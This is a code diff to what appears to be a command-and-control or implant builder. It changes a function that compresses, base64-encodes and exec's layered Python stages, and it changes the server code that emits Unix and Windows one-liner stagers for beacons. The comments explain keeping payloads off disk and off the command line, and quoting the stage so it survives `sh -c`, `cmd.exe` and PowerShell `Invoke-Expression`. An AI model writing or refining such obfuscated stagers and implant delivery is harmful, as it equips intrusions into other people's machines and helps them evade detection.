@@ -557,11 +557,22 @@ def _obfuscate_layer(code: str, var_mod: str) -> str:
     `python3 -` child on stdin, which keeps the payload off the child's
     command line and off the disk.
 
-    `globals()["_src"]` rather than a plain assignment: the artifact is
+    `globals()['_src']` rather than a plain assignment: the artifact is
     normally exec'd at module level, where the two are the same, but an
     embedder that execs it from inside a function would bind a local and
     throw the source away without a word. The read in `exec(_src)` is an
     ordinary global load, which works either way.
+
+    **Every string literal here is single-quoted, and that is a delivery
+    requirement rather than a style.** The one-liners that carry this
+    text wrap it in double quotes, so a double quote inside would close
+    them: `CommandLineToArgvW` and PowerShell's argument-mode parser both
+    concatenate the segments and strip the quotes, which handed `-c` an
+    unquoted `globals()[_src]=...` and a `NameError`. With single quotes
+    inside and double quotes outside, and with no `$`, backtick,
+    backslash or `"` anywhere in the emitted text -- base64's alphabet has
+    none of them and neither does the alias -- one text survives `sh -c`,
+    `cmd.exe` and `Invoke-Expression` alike.
 
     With several layers each one binds `_src` in turn and the innermost
     wins, because the innermost is the only one whose decompressed text is
@@ -571,9 +582,9 @@ def _obfuscate_layer(code: str, var_mod: str) -> str:
 
     compressed = zlib.compress(code.encode("utf-8"), 9)
     encoded = base64.b64encode(compressed).decode()
-    return ('import base64 as %s,zlib;'
-            'globals()["_src"]=zlib.decompress(%s.b64decode("%s"));'
-            'exec(_src)' % (var_mod, var_mod, encoded))
+    return ("import base64 as %s,zlib;"
+            "globals()['_src']=zlib.decompress(%s.b64decode('%s'));"
+            "exec(_src)" % (var_mod, var_mod, encoded))
 
 
 def _beacon_config_block(gen_cfg: dict, interval: int, jitter: int,
@@ -1820,7 +1831,14 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
                 "preview": stage[:2000],
             })
 
-        oneliner_unix = f"python3 -c '{stage}'"
+        # Double quotes on both, with single quotes inside the stage
+        # itself: one text that `sh -c`, `cmd.exe` and PowerShell's
+        # `Invoke-Expression` all hand to `-c` as a single argument. The
+        # stage carries no `$`, backtick, backslash or `"`, which is what
+        # makes the double-quoted form safe in all three. See
+        # `_obfuscate_layer`, and `docs/TUNNEL.md` for why the inline
+        # Windows one-liner is undeliverable at this size regardless.
+        oneliner_unix = f'python3 -c "{stage}"'
         oneliner_win = f'python -c "{stage}"'
         stagers = _stagers_for_build(gen_cfg, drops, oneliner_unix,
                                      oneliner_win)
